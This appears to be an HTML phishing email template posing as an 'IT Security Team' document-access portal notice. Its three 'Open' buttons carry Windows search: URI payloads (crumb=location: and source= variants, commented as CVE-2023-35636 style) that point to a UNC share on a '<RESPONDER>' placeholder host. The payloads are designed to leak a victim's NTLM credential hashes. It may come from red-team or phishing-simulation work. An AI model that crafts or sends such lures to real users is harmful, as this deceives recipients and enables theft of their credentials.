<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Access</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background:#f4f4f4; margin:0; padding:20px; }
        .container { max-width:600px; margin:0 auto; background:#fff; border:1px solid #e0e0e0; border-radius:8px; overflow:hidden; }
        .header { background:#038387; padding:20px 30px; color:#fff; }
        .header h2 { margin:0; font-size:18px; }
        .body { padding:30px; color:#333; line-height:1.6; }
        .btn { display:inline-block; background:#038387; color:#fff; padding:10px 24px; border-radius:4px; text-decoration:none; font-size:14px; margin:4px; }
        .footer { background:#f5f5f5; padding:15px 30px; font-size:11px; color:#888; border-top:1px solid #e0e0e0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header"><h2>Document Access Portal</h2></div>
        <div class="body">
            <p>Hello,</p>
            <p>Access links for your shared documents are below. Click the appropriate button to open.</p>
            <p style="text-align:center; margin:30px 0;">
                <!-- Variant 1: crumb= only, no query= param (CVE-2023-35636 style) -->
                <a class="btn" href="search:crumb=location:\\<RESPONDER>\testshare">Open (crumb-only)</a>
                <!-- Variant 2: location: without UNC slashes prefix test -->
                <a class="btn" href="search:query=v2&amp;crumb=location:<RESPONDER>\testshare">Open (single-backslash)</a>
                <!-- Variant 3: source= parameter (older Windows Search param) -->
                <a class="btn" href="search:query=v3&amp;source=\\<RESPONDER>\testshare">Open (source= param)</a>
            </p>
            <p>Contact IT if you have difficulty accessing these resources.</p>
            <p>IT Security Team</p>
        </div>
        <div class="footer">Secure document portal — authorized access only.</div>
    </div>
</body>
